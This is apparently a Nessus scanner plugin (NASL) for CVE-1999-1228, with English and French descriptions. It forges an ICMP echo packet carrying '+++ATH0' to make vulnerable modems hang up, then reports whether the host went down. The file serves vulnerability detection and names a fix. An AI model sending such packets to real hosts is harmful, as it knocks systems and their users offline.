#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10020);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-1999-1228");
 name["english"] = "+ + + ATH0 modem hangup";
 name["francais"] = "Décrochage du modem par la séquence + + + ATH0";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to disconnect the remote
host by sending it an ICMP echo request packet 
containing the string '+ + + ATH0' (without the spaces).
It is also possible to make the remote modem
hangup and dial any phone number.

Solution : add 'ATS2=255' in your modem
init string.

Risk factor : High";


 desc["francais"] = "
Il s'est avéré possible de forcer la machine
distante à se deconnecter en lui envoyant
une requête ICMP echo contenant la chaine
'+ + + ATH0' (sans les espaces). 
Il est aussi possible de forcer le modem
à raccrocher et à composer un numéro
de téléphone arbitraire.

Solution : ajoutez 'ATS2=255'
dans la chaine d'init du modem.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Makes a modem hangup";
 summary["francais"] = "Fait raccrocher un modem";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#

ip = forge_ip_packet(ip_hl:5, ip_v:4,   ip_off:0,
		     ip_id:9, ip_tos:0, ip_p : IPPROTO_ICMP,
		     ip_len : 20, ip_src : this_host(),
		     ip_ttl : 255);


data = string("+++ATH0\r\n");			  
icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
		 	  icmp_seq : 2, icmp_id : 2, 
			  data:data);

start_denial();
			  
reply1 = send_packet(icmp, pcap_active:TRUE);

alive = end_denial();

if(!alive){
 	security_hole(0);
	set_kb_item(name:"Host/dead", value:TRUE);
	}

 					
